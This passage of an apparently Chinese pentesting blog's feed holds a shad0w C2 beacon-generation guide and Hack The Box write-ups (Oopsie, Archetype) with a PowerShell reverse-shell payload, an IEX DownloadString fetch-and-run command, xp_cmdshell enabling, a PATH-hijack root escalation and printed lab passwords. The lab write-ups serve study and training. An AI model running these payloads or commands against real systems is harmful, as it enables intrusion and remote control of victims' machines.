class="line">vmrc：Microsoft VirtualServer 2005</span><br><span class="line">vnc：VNC服务器</span><br><span class="line">VPN：虚拟专用网络</span><br><span class="line">VProRecovery Backup Exec系统恢复代理7.0</span><br><span class="line">VProRecovery Backup Exec系统恢复代理8.0</span><br><span class="line">VProRecovery Backup Exec系统恢复代理9.0</span><br><span class="line">VProRecovery诺顿克隆代理12.0</span><br><span class="line">VProRecovery诺顿</span><br><span class="line">克隆代理14.0 VProRecovery诺顿克隆代理15.0</span><br><span class="line">VProRecovery Symantec系统恢复代理10.0</span><br><span class="line">VProRecovery Symantec系统恢复代理11.0</span><br><span class="line">VProRecovery Symantec系统恢复代理14.0</span><br><span class="line">vssrvc：微软虚拟服务器（2005）</span><br><span class="line">WSMAN：Windows远程管理（基于WS-Management标准）服务</span><br><span class="line">xmpp / XMPP：可扩展消息和呈现协议（Jabber）</span><br><span class="line">xgrid：苹果的分布式（网格）计算/ Mac OS X 10.6服务器管理</span><br><span class="line">YARN：ClouderaMapReduce</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里有个不错的github有关SPN的项目：<br><a href="https://github.com/cyberark/RiskySPN">RiskySPN</a></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>kerberos认证的过程把其中的票据的生成和三者之间的关系弄清楚较为关键，我推荐B站有个视频讲的不错：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Kerberos UP主: ziaolin http://www.bilibili.com/video/BV1XW411e7Cs?share_medium=android&amp;share_source=more&amp;bbid=XYADBFAAC65F9C5F6DA603D4376B81D82AFF9&amp;ts=1593051508078</span><br></pre></td></tr></table></figure><p>后续打算再把Kerberos攻击的几种方式整理罗列一下，先给自己挖个坑……</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p> <a href="https://pentestlab.blog/2018/06/12/kerberoast/">https://pentestlab.blog/2018/06/12/kerberoast/</a><br> <a href="http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/">http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/</a><br> <a href="https://skypacer210.github.io/2014/04/09/kerberos-those-thing/">https://skypacer210.github.io/2014/04/09/kerberos-those-thing/</a><br> <a href="https://docs.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)#msdn_pac_request">https://docs.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)#msdn_pac_request</a><br> <a href="https://tools.ietf.org/html/rfc1510">https://tools.ietf.org/html/rfc1510</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;最近在学习域渗透，整理了一下大佬的内容，巩固一下Kerberos基础。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1</summary>
      
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="域渗透" scheme="http://example.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>C2-shad0w</title>
    <link href="http://example.com/2020/06/14/C2-shad0w/"/>
    <id>http://example.com/2020/06/14/C2-shad0w/</id>
    <published>2020-06-14T08:03:24.000Z</published>
    <updated>2021-09-28T09:46:04.729Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C2-shad0w"><a href="#C2-shad0w" class="headerlink" title="C2-shad0w"></a>C2-shad0w</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>shad0w是一个后开发框架，旨在安全网络秘密运行，为攻击者提供更加便利的控制手段。</p></blockquote><p>##简介与安装</p><blockquote><p>sha0w在docker内部运行，所以需要安装docker环境</p></blockquote><p>这里以Centos7为环境搭建，</p><ol><li>使用官方安装脚本自动安装docker</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure><p>也可以使用国内daocloud 一键安装命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/docker | sh</span><br></pre></td></tr></table></figure><ol start="2"><li>安装shad0w</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/bats3c/shad0w.git &amp;&amp; cd shad0w</span><br><span class="line">sudo ./shad0w install</span><br></pre></td></tr></table></figure><p>最终拉取镜像如下：</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200613180236447.png" alt="image-20200613180236447"></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="开启监听"><a href="#开启监听" class="headerlink" title="开启监听"></a>开启监听</h3><p>启动C2服务器，开启监听</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shdow listen -e &lt;endpoint&gt;</span><br><span class="line">#&lt;endpoint&gt;为C2的监听ip地址或者域名，SSL证书同时动态生成</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/eHNSZP.png" alt="eHNSZP"></p><p>如果要使用网站镜像功能，可以使用<code>-m</code>或者<code>--mirror</code>选项</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shad0w listen -e www.baidu.com -m  www.qq.com</span><br></pre></td></tr></table></figure><blockquote><p>这表明如果访问<a href="http://www.baidu.com的c2地址,将返回www.qq.com的内容,可以理解为克隆网站,比如访问www.baidu.com/1.html%EF%BC%8C%E8%BF%94%E5%9B%9E%E7%9A%84%E6%98%AFwww.qq.com/1,html%E7%9A%84%E5%86%85%E5%AE%B9%E3%80%82">www.baidu.com的C2地址，将返回www.qq.com的内容，可以理解为克隆网站，比如访问www.baidu.com/1.html，返回的是www.qq.com/1,html的内容。</a></p></blockquote><h3 id="生成Beacon"><a href="#生成Beacon" class="headerlink" title="生成Beacon"></a>生成Beacon</h3><p>根据作者描述，<code>shad0w</code>目前只支持64位beacon</p><p>有两种<code>beacon</code>：<code>secure</code>、<code>insecure</code>，</p><p><code>secure beacon</code>用于在红队测试的环境，目标存在检测dll注入等安全设备，用于最新版的windows。</p><p><code>insecure beacon</code>旨在用于不是重要的渗透测试环境中，适用于各种windows系统版本。</p><p><code>beacon</code>生成用法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shad0w beacon -p &lt;payload&gt; -H &lt;c2 address&gt; -f &lt;format&gt; -o &lt;filename&gt;</span><br></pre></td></tr></table></figure><p>正确的Payload格式语法如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;arch&gt;/&lt;os&gt;&lt;secure&gt;&lt;static&gt;</span><br></pre></td></tr></table></figure><p>举个例子，要生成一个静态的windows 64位的beacon</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x64/windows/secure/static</span><br></pre></td></tr></table></figure><p>Examble 1（<code>secure beacon</code>）:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shad0w beacon -p x64/windows/secure -H www.baidu.com -f exe -o baidu.exe</span><br></pre></td></tr></table></figure><p>Examble 2 (<code>insecure beacon</code>)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shad0w beacon -p x64/windows -H www.baidu.com -f exe -o baidu.exe</span><br></pre></td></tr></table></figure><p>对于<code>format</code>有三种选择：exe、shellcode、powershell</p><p>Examble 3</p><p>对于shellcode和powershell的beacon，可以使用<code>raw</code>和<code>psh</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shad0w beacon -p x64/windows/secure -H www.baidu.com -f raw -o baidu.binshad0w beacon -p x64/windows/secure/static -H www.baidu.com -f psh -o baidu.ps1</span><br></pre></td></tr></table></figure><h2 id="辅助用法"><a href="#辅助用法" class="headerlink" title="辅助用法"></a>辅助用法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shad0w &gt;&gt;help  #查看帮助页面</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shad0w &gt;&gt; beacons #查看当前在线的主机</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shad0w &gt;&gt; beacons -i 1 # Intercat会话ID为1的主机</span><br></pre></td></tr></table></figure><h2 id="效果如下："><a href="#效果如下：" class="headerlink" title="效果如下："></a>效果如下：</h2><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/7bT7hf.png" alt="7bT7hf"></p><p>通过<code>help</code>命令可查看相关用法，例如常见的mimikatz</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/O6og3L.png" alt="O6og3L"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;C2-shad0w&quot;&gt;&lt;a href=&quot;#C2-shad0w&quot; class=&quot;headerlink&quot; title=&quot;C2-shad0w&quot;&gt;&lt;/a&gt;C2-shad0w&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="神兵利器" scheme="http://example.com/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
    <category term="Tool" scheme="http://example.com/tags/Tool/"/>
    
  </entry>
  
  <entry>
    <title>Hackbox-Oopsie</title>
    <link href="http://example.com/2020/05/24/Hackbox-Oopsie/"/>
    <id>http://example.com/2020/05/24/Hackbox-Oopsie/</id>
    <published>2020-05-24T15:11:54.000Z</published>
    <updated>2021-09-28T09:20:09.154Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hackbox-Oopsie"><a href="#Hackbox-Oopsie" class="headerlink" title="Hackbox -Oopsie"></a>Hackbox -Oopsie</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -T4 10.10.10.28</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524211054709.png" alt="image-20200524211054709"></p><p>观察发现，目标开放了22、80端口</p><p>访问目标80端口，不知道什么一个稀奇古怪的网站</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524211334431.png" alt="image-20200524211334431"></p><p>Web页面的话，当然是启动burp神器</p><p>burp观察爬取到一些url</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524211705547.png" alt="image-20200524211705547"></p><p>观察发现似乎有个登录页面，访问看看</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524211923514.png" alt="image-20200524211923514"></p><h2 id="尝试攻击"><a href="#尝试攻击" class="headerlink" title="尝试攻击"></a>尝试攻击</h2><p>继上述登录页面，按老美的思路和常见这种靶机的打法思路来看，这种登录接口的密码极有可能和目标网站的一些关键词有关。</p><p>利用burp爆破得到两个用户admin和administrator,密码都是MEGACORP_4dm1n!!</p><p>登录一下查看</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524212854146.png" alt="image-20200524212854146"></p><p>有个上传页面，但似乎权限不足，根据提示还有个超级管理员账号</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524213028810.png" alt="image-20200524213028810"></p><p>刷新accounts页面，抓包发现有个诡异点</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524213145555.png" alt="image-20200524213145555"></p><p>挖SRC大佬肯定已经发现，这里可能存在越权或者用户遍历，试试爆破</p><p>设置ID为爆破字段，Payload写个1到100吧，应该不会太大ID吧，不然我就要骂人了</p><p>重定向选择总是跟随</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524213438069.png" alt="image-20200524213438069"></p><p>爆破得到ID值30为超级管理账户，user字段为86575，替换请求包，得到超级管理员权限</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524213754027.png" alt="image-20200524213754027"></p><p>再次访问上传页面</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524214154423.png" alt="image-20200524214154423"></p><p>上传php马</p><p>利用工具<code>weevely</code>生成php webshell</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524214508418.png" alt="image-20200524214508418"></p><p>Repeater一下，上传成功但似乎没有返回路径</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524214845512.png" alt="image-20200524214845512"></p><blockquote><p>PS:这里注意上传时同样要替换user字段，这里没注意，图截错了，将就着看</p></blockquote><p>利用扫目录工具可以扫到一个uploads目录</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524215045193.png" alt="image-20200524215045193"></p><p>weevely连接webshell</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524215631386.png" alt="image-20200524215631386"></p><p>好像权限不高</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524220355679.png" alt="image-20200524220355679"></p><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>翻垃圾ing</p><p>翻到一个数据库连接密码robert/M3g4C0rpUs3r!</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524220503313.png" alt="image-20200524220503313"></p><p>由于这里需要su用户,需要一个终端</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524223227565.png" alt="image-20200524223227565"></p><p>输入以下命令,弹回交互式终端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHELL=/bin/bash script -q /dev/null</span><br><span class="line">Ctrl-Z</span><br><span class="line">stty raw -echo</span><br><span class="line">fg</span><br><span class="line">reset</span><br><span class="line">xterm</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524224006134.png" alt="image-20200524224006134"></p><p>切换成功，id查看用户信息，显示<strong>robert</strong>是<strong>Bugracker</strong>组的成员</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524224304929.png" alt="image-20200524224304929"></p><h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><p>翻垃圾…</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -type f -group bugtracker 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524224527753.png" alt="image-20200524224527753"></p><p>查看该文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -la /usr/bin/bugtracker</span><br></pre></td></tr></table></figure><p>运行该文件看看，似乎需要提供id值，随便填了个</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524224942679.png" alt="image-20200524224942679"></p><p>好像是基于ID值输出报告，利用<code>strings</code>命令看看是如何工作的</p><blockquote><p>Strings命令相关用法参考：<a href="https://blog.csdn.net/stpeace/article/details/46641069">https://blog.csdn.net/stpeace/article/details/46641069</a></p></blockquote><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524225243714.png" alt="image-20200524225243714"></p><p>观察发现cat命令使用的是相对路径而不是绝对路径</p><blockquote><p>提权思路：创建恶意程序<code>cat</code>，并修改路径以包括当前工作目录，利用这种错误配置，提权为root</p></blockquote><p>当前工作目录添加到PATH，创建cat 二进制文件，赋予执行权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /tmp/</span><br><span class="line">echo &#x27;/bin/sh&#x27; &gt; cat</span><br><span class="line">chmod +x cat</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524225754710.png" alt="image-20200524225754710"></p><p>再次执行刚刚的脚本文件，提升权限为root</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524230014964.png" alt="image-20200524230014964"></p><p>翻垃圾…翻到ftp用户：ftpuser/mc@F1l3ZilL4</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524230457656.png" alt="image-20200524230457656"></p><blockquote><p>这里注意不要用cat查看文件内容，因为cat命令已被我们改了，可以使用more等其他命令查看</p></blockquote><p>继续翻到root</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524230645348.png" alt="image-20200524230645348"></p><p>继续翻到user.txt</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524230838795.png" alt="image-20200524230838795"></p><h2 id="游戏技术"><a href="#游戏技术" class="headerlink" title="游戏技术"></a>游戏技术</h2><p>到此游戏结束，获得外号垃圾王</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Hackbox-Oopsie&quot;&gt;&lt;a href=&quot;#Hackbox-Oopsie&quot; class=&quot;headerlink&quot; title=&quot;Hackbox -Oopsie&quot;&gt;&lt;/a&gt;Hackbox -Oopsie&lt;/h1&gt;&lt;h2 id=&quot;信息搜集&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="靶机复现" scheme="http://example.com/categories/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="OSCP" scheme="http://example.com/tags/OSCP/"/>
    
  </entry>
  
  <entry>
    <title>Hackbox初探</title>
    <link href="http://example.com/2020/05/18/Hackbox-%E5%88%9D%E6%8E%A2/"/>
    <id>http://example.com/2020/05/18/Hackbox-%E5%88%9D%E6%8E%A2/</id>
    <published>2020-05-18T15:36:58.000Z</published>
    <updated>2021-09-28T09:28:18.976Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hackbox初探"><a href="#Hackbox初探" class="headerlink" title="Hackbox初探"></a>Hackbox初探</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>hackthebox是一个非常不错的在线实验平台，能帮助你提升渗透测试技能和黑盒测试技能，平台上有很多靶机，从易到难，各个级别的靶机都有。</p></blockquote><p>关于hackbox注册账号，这里就不赘述了，详情参考百度</p><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p>Nmap扫描目标ip</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -T4 10.10.10.27</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518202226161.png" alt="image-20200518202226161"></p><p>观察发现，目前开启了1433、445，开启了SQLserver和smb共享服务</p><blockquote><p>思路：目标开启了smb服务，尝试是否可匿名访问</p></blockquote><p>利用smbclient工具进行尝试访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -N -L \\\\10.10.10.27\\</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518202957752.png" alt="image-20200518202957752"></p><p>观察发现有个backup，很可疑，利用工具smbclient看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient  -N \\\\10.10.10.27\\backups</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518203517978.png" alt="image-20200518203517978"></p><p>有一个dtsConfig文件，它是与SSIS一起使用的配置文件。</p><p>相关SSIS介绍可参考下面链接</p><blockquote><p><a href="https://baike.baidu.com/item/SSIS/5351898?fr=aladdin">https://baike.baidu.com/item/SSIS/5351898?fr=aladdin</a></p></blockquote><p>下载dtsConfig文件</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518204446382.png" alt="image-20200518204446382"></p><p>观察有个sql链接，还有个本地windows用户凭据ARCHETYPE\sql_svc</p><h2 id="深入利用"><a href="#深入利用" class="headerlink" title="深入利用"></a>深入利用</h2><p>使用<a href="https://github.com/SecureAuthCorp/impacket">Impacket工具包</a> 中mssqlclient.py 结合上一步得到的凭据连接到SQL Server 。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518224208800.png" alt="image-20200518224208800"></p><p>查看当前用户是否是最高权限</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;sysadmin&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518224814948.png" alt="image-20200518224814948"></p><p>Nice！sysadmin权限</p><p>开启xp_cmdshell</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--打开xp_cmdshell</span></span><br><span class="line"> <span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;RECONFIGURE;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;RECONFIGURE;</span><br><span class="line"><span class="comment">--关闭xp_cmdshell</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;RECONFIGURE;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">0</span>;RECONFIGURE;</span><br></pre></td></tr></table></figure><p>尝试执行命令</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518225619469.png" alt="image-20200518225619469"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>尝试利用powershell反弹shell，构造Payload如下,保存ps1</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.10.14.138&quot;</span>,<span class="number">1234</span>);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&quot;# &quot;</span>;<span class="variable">$sendbyte</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure><p>利用python建立http服务</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure><p>开启终端监听反弹端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure><p>利用xp_cmdshell远程加载Powershell，Payload如下</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell &quot;IEX (<span class="keyword">New</span><span class="operator">-</span>Object Net.WebClient).DownloadString(\&quot;http://10.10.14.138/1.ps1\&quot;);&quot; </span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518230436267.png" alt="image-20200518230436267"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518230518649.png" alt="image-20200518230518649"></p><p>翻垃圾找到user.txt</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518232024516.png" alt="image-20200518232024516"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>由于该账户既是服务账户也是本地普通账户，因此得检查历史命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt </span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518232227210.png" alt="image-20200518232227210"></p><p>观察得知，在做backup共享时使用本地管理员进行映射</p><p>利用Impacket工具包中的psexec.py提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psexec.py administrator@10.10.10.27</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518233119398.png" alt="image-20200518233119398"></p><p>桌面翻到垃圾</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518233353538.png" alt="image-20200518233353538"></p><h2 id="游戏结束"><a href="#游戏结束" class="headerlink" title="游戏结束"></a>游戏结束</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Hackbox初探&quot;&gt;&lt;a href=&quot;#Hackbox初探&quot; class=&quot;headerlink&quot; title=&quot;Hackbox初探&quot;&gt;&lt;/a&gt;Hackbox初探&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="靶机复现" scheme="http://example.com/categories/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="OSCP" scheme="http://example.com/tags/OSCP/"/>
    
  </entry>
  
  <entry>
    <title>基于Centos快速搭建ELK</title>
    <link href="http://example.com/2020/05/07/%E5%9F%BA%E4%BA%8ECentos7%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAELK/"/>
    <id>http://example.com/2020/05/07/%E5%9F%BA%E4%BA%8ECentos7%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAELK/</id>
    <published>2020-05-07T15:44:24.000Z</published>
    <updated>2021-09-28T09:37:54.469Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基于Centos快速搭建ELK"><a href="#基于Centos快速搭建ELK" class="headerlink" title="基于Centos快速搭建ELK"></a>基于Centos快速搭建ELK</h1><p>[TOC]</p><blockquote><p>ELK是一个成熟的日志系统，主要功能有收集、分析、检索，详细见 <a href="https://www.elastic.co/cn/products">elastic官网</a>。</p><p>本文主要介绍如何在CentOS7下安装最新版本的ELK，当然现在docker已经有完全配置成功的elk容器，安装配置非常方便.</p></blockquote><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul><li>centos-7-x86_64</li><li>java8</li><li>elasticsearch-7.6.2</li><li>kibana-7.6.2</li><li>logstash-7.6.2</li></ul><h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><h3 id="关闭防火墙和Selinux"><a href="#关闭防火墙和Selinux" class="headerlink" title="关闭防火墙和Selinux"></a>关闭防火墙和Selinux</h3><p><strong>关闭Selinux</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/sysconfig/selinux</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELINUX=disabled      #需重启永久生效 </span><br><span class="line">wq                    #保存退出</span><br><span class="line">setenforce 0             #临时生效</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200504171123609.png" alt="image-20200504171123609"></p><p><strong>关闭Firewalld</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld         #关闭防火墙</span><br><span class="line">systemctl disable firewalld    #禁止开机自启</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200504171423477.png" alt="image-20200504171423477"></p><h3 id="安装JDK"><a href="#安装JDK" class="headerlink" title="安装JDK"></a>安装JDK</h3><p>先是确认环境rpm -qa|grep <a href="https://www.linuxidc.com/Java">Java</a><br>如果有其他版本的请删除<br>rpm–e –nodeps java-*<br>检查是否删除<br>java –version</p><h3 id="安装Elasticsearch"><a href="#安装Elasticsearch" class="headerlink" title="安装Elasticsearch"></a>安装Elasticsearch</h3><ol><li>导入密钥</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch</span><br></pre></td></tr></table></figure><ol start="2"><li>下载最新的安装包</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget 